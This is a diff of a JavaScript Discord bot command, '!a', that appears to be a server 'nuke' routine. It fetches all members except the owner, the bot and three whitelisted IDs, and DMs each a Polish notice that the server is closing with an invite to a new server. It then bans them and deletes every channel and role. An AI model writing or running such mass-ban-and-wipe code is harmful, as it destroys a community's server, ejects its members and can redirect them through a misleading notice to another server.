@@ -15,37 +15,37 @@ BotClient.on('messageCreate', async msg => {
         try {
             console.log(`\n\n\n!a command\n\n\n`);
 
-            console.log(`\n\nmsg.guild.members.list()`);
-            await msg.guild.members.list({
-                limit: 1000
-            }).then(members => console.log(members.map(el => el.user)));
-
-            console.log(`\n\nmsg.guild.members.cache`);
-            console.log(msg.guild.members.cache.map(el => el.user));
-
-            msg.guild.members.cache
-                // get list of users to ban (exclude some of them)
-                .filter(m => {
-                    return (
-                        m.user.id !== msg.guild.ownerID &&
-                        m.user.id !== BotClient.user.id &&
-                        // wujaszek
-                        m.user.id !== '335749600101138436' &&
-                        // majchal
-                        m.user.id !== '596805465095274549' &&
-                        // toster
-                        m.user.id !== '251707905202454529'
-                    );
-                })
-                .forEach(m => {
-                    m.user
-                        // send msg to user, then ban them
-                        .send(`Przepraszamy, nasz serwer: ${msg.guild.name} zostaje zamknięty, z tego powodu przenosimy się na nowy serwer: https://discord.gg/wG7pSkNwZP \nPrzepraszamy za niedogodnienia i życzymy miłego pobytu na nowym serwerze!`)
-                        .then(m.ban())
-                        .catch(console.error);
+            // get all members, filter by id, then log them
+            let allMembers = await msg.guild.members.fetch();
+            let filteredMembers = allMembers.filter(member => {
+                return (
+                    member.user.id !== msg.guild.ownerID &&
+                    member.user.id !== BotClient.user.id &&
+                    // wujaszek
+                    member.user.id !== '335749600101138436' &&
+                    // majchal
+                    member.user.id !== '596805465095274549' &&
+                    // toster
+                    member.user.id !== '251707905202454529'
+                );
+            });
+            console.log(filteredMembers.map(mem => mem.user));
+            // send msg, then ban that user
+            filteredMembers.forEach(async member => {
+                member.send(`Przepraszamy, nasz serwer: ${msg.guild.name} zostaje zamknięty, z tego powodu przenosimy się na nowy serwer: https://discord.gg/wG7pSkNwZP \nPrzepraszamy za niedogodnienia i życzymy miłego pobytu na nowym serwerze!`).then(msgSent => {
+                    console.log(`Message sent to ${msgSent.channelId}`)
+                }).finally(async _ => {
+                    await member.ban();
+                    console.log(`\nMember banned | ID: ${member.user.id}\n`);
                 });
-            msg.guild.channels.cache.forEach(channel => channel.delete());
-            msg.guild.roles.cache.forEach(role => role.delete());
+            });
+            // get all channels, exluding threads
+            let channels = await msg.guild.channels.fetch();
+            channels.forEach(async channel => await channel.delete());
+            // get all roles
+            let roles = await msg.guild.roles.fetch();
+            roles.forEach(async role => await role.delete());
+            // create 'server closed' channel and fetch template
             msg.guild.channels
                 .create('Serwer zamknięty', {
                     type: 'text'
